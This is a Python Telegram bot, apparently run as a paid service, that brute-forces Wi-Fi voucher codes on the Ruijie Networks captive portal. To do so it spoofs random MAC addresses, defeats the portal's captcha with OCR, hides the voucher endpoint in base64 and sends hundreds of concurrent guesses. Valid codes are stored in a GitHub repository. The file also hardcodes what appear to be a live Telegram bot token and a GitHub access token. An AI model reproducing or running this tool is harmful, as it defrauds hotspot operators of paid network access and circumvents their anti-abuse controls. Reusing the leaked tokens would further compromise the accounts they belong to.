import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ── Environment variables ─────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8947878806:AAG1GmhB_jrARQ4LwO7pzKJV2UdbHC7_A1I")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN = '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'")
REPO_OWNER = os.getenv("REPO_OWNER", "phyoe001pp-design")
REPO_NAME = os.getenv("REPO_NAME", "ATM")
ADMIN_ID = os.getenv("ADMIN_ID", "6658845504")

# ── Global structures ────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
approve = {}
scan_tasks = {}
success_texts = {}       # {chat_id: [{"code":..., "plan":..., "expire":...}, ...]}
old_success_texts = {}
limited_texts = {}
old_limited_texts = {}
captcha_state = {}
notify_setting = {}
last_scan_params = {}
pending_brute = {}
notify_state = {}
success_messages = {}    # 🛠️ FIX: was missing → KeyError crash
retry_counts = {}        # 🛠️ FIX: was missing → KeyError crash

session = None
_connector = None

# ── Helper: send long text ───────────────
async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
    MAX = 4096
    if len(text) <= MAX:
        await bot.send_message(chat_id, text, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id)
        return
    lines = text.split("\n")
    chunk = ""
    first = True
    for line in lines:
        candidate = chunk + ("\n" if chunk else "") + line
        if len(candidate) > MAX:
            if chunk:
                await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                                       reply_to_message_id=reply_to_message_id if first else None)
                first = False
            chunk = line
        else:
            chunk = candidate
    if chunk:
        await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id if first else None)

CONCURRENCY = 300
_voucher_sem = None
_start_time = time.monotonic()

# ── Web server (keep alive) ──────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ── GitHub helpers ───────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
    except:
        pass
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ── Helper functions ─────────────────────
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
            second=0, tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    if plan in ("unlimited", "unlimit"):
        return "9999-12-31T23:59:59Z"
    total_seconds = 0
    parts = re.findall(r'(\d+)([dhm])', plan)
    if not parts:
        return None
    for val, unit in parts:
        val = int(val)
        if unit == 'd':
            total_seconds += val * 86400
        elif unit == 'h':
            total_seconds += val * 3600
        elif unit == 'm':
            total_seconds += val * 60
    if total_seconds == 0:
        return None
    return (now + timedelta(seconds=total_seconds)).isoformat()

PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def iter_codes(mode):
    """Generate voucher codes to try."""
    mode = mode.lower().strip()
    
    if mode == "6":
        # 6-digit numeric codes - try all combos
        codes = [str(i).zfill(6) for i in range(10 ** 6)]
        random.shuffle(codes)
        yield from codes
        return
    
    if mode == "7":
        # 7-digit numeric codes - infinite random
        while True:
            yield "".join(random.choice(string.digits) for _ in range(7))
    
    if mode == "8":
        # 8-digit numeric codes - infinite random
        while True:
            yield "".join(random.choice(string.digits) for _ in range(8))
    
    if mode == "all":
        # Mixed alphanumeric, random length 6-8
        chars = string.ascii_letters + string.digits
        while True:
            length = random.choice([6, 7, 8])
            yield "".join(random.choice(chars) for _ in range(length))
    
    if mode == "ascii-lower":
        while True:
            yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    
    # Fallback
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha handling ─────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper() if result else None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    try:
        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as req:
            return await req.read()
    except:
        return None

async def Varify_Captcha(session_obj, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    try:
        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data) as req:
            data = await req.json()
            return session_id if data.get("success") is True else None
    except:
        return None

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

# ── Balance checker ──────────────────────
def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    return f"{hours}h {mins}m" if hours > 0 else f"{mins}m" if mins > 0 else f"{secs}s"

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

async def get_balance(session_id):
    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}"
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return "Error"
            data = await resp.json()
            candidates = [data]
            for nk in ['result', 'data']:
                if isinstance(data, dict) and isinstance(data.get(nk), dict):
                    candidates.append(data[nk])
            for d in candidates:
                if not isinstance(d, dict):
                    continue
                for k in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    if d.get(k) is not None:
                        return _parse_minutes(d.get(k))
                for k in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                    if d.get(k) is not None:
                        return _parse_seconds(d.get(k))
            return "N/A"
    except:
        return "N/A"

# 🛠️ FIX: Added this missing function
async def Code_Expires_Date(session_id):
    """Get expiry info for a code using session."""
    try:
        balance_text = await get_balance(session_id)
        return f"⏳ Balance: {balance_text}"
    except:
        return "⏳ N/A"

# ── Core voucher check ───────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    """Check a single voucher code against the Ruijie portal."""
    global _connector
    
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for _attempt in range(3):
        # 🛠️ FIX: Create fresh session per attempt to avoid connector issues
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(limit=1, ssl=False)
        
        async with aiohttp.ClientSession(
            connector=connector,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                await asyncio.sleep(1)
                continue

            # Try captcha up to 5 times
            auth_code = None
            for captcha_attempt in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    if not image:
                        await asyncio.sleep(0.5)
                        continue
                    text = await Captcha_Text(image)
                    if not text:
                        await asyncio.sleep(0.5)
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[captcha] attempt {captcha_attempt+1} error: {e}")
                    await asyncio.sleep(0.5)
            
            if not auth_code:
                print(f"[captcha] FAILED for code={code}, session expired or captcha unsolvable")
                continue

            # 🛠️ FIX: Check scan hasn't been stopped
            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
                    
                    # 🛠️ FIX: Better response parsing
                    if 'logonUrl' in response or 'logonUrl' in resp_json:
                        # 🛠️ FIX: Get the logonUrl for verification
                        logon_url = resp_json.get('result', {}).get('logonUrl') or resp_json.get('logonUrl') or ''
                        if logon_url:
                            print(f"[voucher] ✅ SUCCESS! code={code} logonUrl exists")
                            # Success path
                            if recheck:
                                return code
                            
                            # 🛠️ FIX: Initialize if needed
                            if chat_id not in success_texts:
                                success_texts[chat_id] = []
                            
                            expire_date = await Code_Expires_Date(session_id)
                            # 🛠️ FIX: Store as dict, not string
                            code_entry = {"code": code, "plan": "found", "expire": expire_date}
                            success_texts[chat_id].append(code_entry)
                            
                            # 🛠️ FIX: Put complete data into queue
                            await SUCCESS_CODE.put({
                                "chat_id": chat_id,
                                "code": code,
                                "session_id": session_id,
                                "plan": "found"
                            })
                            
                            if message:
                                try:
                                    code_lines = []
                                    for entry in success_texts[chat_id]:
                                        code_lines.append(f"🎫 {entry['code']}\n   {entry['expire']}")
                                    all_codes = "\n\n".join(code_lines)
                                    
                                    # 🛠️ FIX: Initialize success_messages dict properly
                                    if chat_id not in success_messages:
                                        sent = await bot.send_message(
                                            chat_id=message.chat.id,
                                            text=f"✅ Success Codes:\n\n{all_codes}",
                                        )
                                        success_messages[chat_id] = sent.message_id
                                    else:
                                        try:
                                            await bot.edit_message_text(
                                                chat_id=message.chat.id,
                                                message_id=success_messages[chat_id],
                                                text=f"✅ Success Codes:\n\n{all_codes}",
                                            )
                                        except:
                                            sent = await bot.send_message(
                                                chat_id=message.chat.id,
                                                text=f"✅ Success Codes:\n\n{all_codes}",
                                            )
                                            success_messages[chat_id] = sent.message_id
                                except Exception as e:
                                    print(f"[success_message] Error: {e}")
                            return code
                    
                    # Check for other conditions
                    if 'request limited' in response or 'rate' in response.lower():
                        print(f"[voucher] Rate limited on code={code}, retry {_attempt+1}/3")
                        # 🛠️ FIX: Initialize retry_counts
                        if chat_id not in retry_counts:
                            retry_counts[chat_id] = 0
                        retry_counts[chat_id] += 1
                        await asyncio.sleep(2)
                        continue
                    
                    if 'invalid' in response.lower() or 'error' in response.lower() or 'fail' in response.lower():
                        print(f"[voucher] ❌ Invalid code={code}")
                        return None
                        
            except Exception as e:
                print(f"[perform_check] request error: {e}")
                await asyncio.sleep(1)
                continue
        
        # If we got a response that wasn't a success and wasn't rate-limited
        if response and 'request limited' not in response:
            break

    return None

# ── Brute-force runner ───────────────────
async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
    """Run brute force scan with given mode."""
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    
    checked, found = 0, 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    
    try:
        batch_size = 1000  # 🛠️ FIX: Reduced batch size for better reliability
        
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                print(f"[brute] Scan stopped for chat_id={chat_id}")
                return
            
            # Collect a batch of codes
            batch = []
            for _ in range(batch_size):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            
            if not batch:
                print("[brute] No more codes to try")
                break
            
            # Check each code with rate limiting
            tasks = []
            for c in batch:
                task = asyncio.create_task(
                    perform_check(
                        session_url, c, chat_id, scan_id, 
                        message=message, plan_filters=plan_filters
                    )
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for res in results:
                if res and not isinstance(res, Exception):
                    found += 1
                    if target and found >= target:
                        try:
                            await bot.edit_message_text(
                                chat_id=chat_id,
                                message_id=progress_msg.message_id,
                                text="🎯 Target reached! Scan complete."
                            )
                        except:
                            pass
                        return
            
            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            
            text = format_progress(checked, None, speed, found, target)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text
                )
            except:
                pass
            
            # 🛠️ FIX: Small delay to prevent rate limiting
            await asyncio.sleep(0.5)
    
    except asyncio.CancelledError:
        print(f"[brute] Task cancelled for chat_id={chat_id}")
    except Exception as e:
        print(f"[brute] Fatal error: {e}")
    finally:
        scan_tasks.pop(chat_id, None)
        print(f"[brute] Cleaned up scan task for chat_id={chat_id}")

# ── GitHub scheduler ─────────────────────
async def github_update_scheduler():
    """Save found codes to GitHub every 80 seconds."""
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        
        if not items:
            continue
        
        try:
            results, sha = await get_file_content("result.json")
            if results is None:
                results = {}
            
            for item in items:
                cid = str(item["chat_id"])
                if cid not in results:
                    results[cid] = []
                results[cid].append({
                    "code": item["code"],
                    "session_id": item.get("session_id", ""),
                    "plan": item.get("plan", "unknown")
                })
            
            await update_file_content("result.json", results, sha, "Update Results")
            print(f"[github] Saved {len(items)} codes to GitHub")
        except Exception as e:
            print(f"[github] Error: {e}")

# ── Bot commands ─────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "/key - သင်၏ key ကို အတည်ပြုရန်\n"
        "/setup [session_url] - Session URL သတ်မှတ်ရန်\n"
        "/brute <mode> [target] [plan] - Code ရှာဖွေရန်\n"
        "   Mode: 6, 7, 8, all\n"
        "   /brute 6 10 1d (၆ လုံး၊ ၁၀ ခု၊ ၁ ရက်)\n"
        "/stop - ရပ်ရန်\n"
        "/saved - သိမ်းထားသော code များကြည့်ရန်\n"
        "/notify - အကြောင်းကြားချက် On/Off\n"
        "/genkey <duration> <user_id> - (Admin) Key ထုတ်ရန်"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    cid = message.chat.id
    if str(cid) == ADMIN_ID:
        approve[cid] = True
        await bot.reply_to(message, "✅ Admin အဖြစ် အတည်ပြုပြီးပါပြီ။ /setup ဖြင့် စတင်ပါ။")
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if str(cid) in auth_list:
        if check_key_expiration(auth_list[str(cid)]):
            approve[cid] = True
            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် စတင်ပါ။")
        else:
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို register မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /setup your_session_url")
        return
    if not approve.get(message.chat.id, False):
        await bot.reply_to(message, "/key အရင်လုပ်ပါ။")
        return
    url = args[1]
    if await check_session_url(url):
        user_data[message.chat.id] = {'session_url': url}
        await bot.reply_to(message, "✅ Setup ပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
    else:
        await bot.reply_to(message, "❌ URL မှားနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /brute <mode> [target] [plan]")
        return
    mode = args[1]
    target = int(args[2]) if len(args) > 2 and args[2].isdigit() else None
    plan_filters = [a for a in args[3:] if PLAN_RE.match(a)]
    cid = message.chat.id
    if not approve.get(cid, False):
        await bot.reply_to(message, "/key အရင်လုပ်ပါ။")
        return
    if cid not in user_data:
        await bot.reply_to(message, "/setup အရင်လုပ်ပါ။")
        return
    
    # Clear previous success message reference for fresh scan
    if cid in success_messages:
        del success_messages[cid]
    if cid in success_texts:
        success_texts[cid] = []
    
    progress_msg = await bot.send_message(cid, f"🔍 Scanning (Mode: {mode})...\n\n⏳ Initializing...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, cid, user_data[cid]['session_url'], scan_id, 
                       target, message, progress_msg, plan_filters)
    )
    scan_tasks[cid] = {"task": task, "stop": False, "scan_id": scan_id}
    await bot.send_message(cid, f"✅ Scan started!\nMode: {mode} | Target: {target or 'unlimited'}")

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    data = scan_tasks.get(message.chat.id)
    if data:
        data["stop"] = True
        await bot.reply_to(message, "🛑 Scan ရပ်လိုက်ပါပြီ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    cid = message.chat.id
    success = success_texts.get(cid, [])
    if not success:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိပါ။")
        return
    
    # 🛠️ FIX: success_texts now stores dicts properly
    lines = ["✅ **Success Codes:**"]
    for entry in success:
        lines.append(f"`{entry['code']}` – {entry.get('expire', '⏳ N/A')}")
    
    await send_chunks(cid, "\n".join(lines))

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    cid = message.chat.id
    notify_setting[cid] = not notify_setting.get(cid, False)
    await bot.reply_to(message, f"Notify: {'ON' if notify_setting[cid] else 'OFF'}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage: /genkey <duration> <user_id>")
        return
    plan, uid = args[1], args[2]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Duration မှားနေသည်။ (ဥပမာ: 1h, 1d, unlimited)")
        return
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[uid] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key for {uid}")
    await bot.reply_to(message, f"✅ Key ထုတ်ပေးပြီးပါပြီ။\nUID: {uid}\nExpires: {expiry}")

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=CONCURRENCY, ssl=False)
    session = aiohttp.ClientSession(connector=_connector)
    asyncio.create_task(web_server())
    asyncio.create_task(github_update_scheduler())
    print("[main] Bot started! Waiting for commands...")
    await bot.polling(non_stop=True)

if __name__ == "__main__":
    asyncio.run(main())